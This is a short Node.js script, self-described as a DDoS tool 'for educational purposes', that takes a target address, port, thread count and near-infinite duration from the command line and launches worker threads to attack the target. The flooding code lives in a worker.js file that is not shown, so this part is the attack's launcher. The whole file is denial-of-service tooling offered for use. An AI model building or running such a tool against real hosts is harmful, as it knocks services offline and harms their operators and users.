const { Worker } = require('worker_threads');

console.log(`DDoS script for educational purposes!`)

const [ddos, dir, address, port, threads = 4, time = 999999999999999999999999999999999999999999999999999999999999999999999999999] = process.argv;

if (!address || !port) {
  return console.log('[ERROR] Use: \'ddos . <address> <port> [<threads> (default 4)] [<time> (in minutes)]\'')
}

for (let i = 0; i < threads; i++) {
  console.log(`[DDoS] Starting thread #${i}...`)

  const worker = new Worker('./worker.js');
  worker.postMessage({
    address,
    port,
    time,
    thread: i
  });
}

console.log("[DDoS]  will start in 3 seconds...")
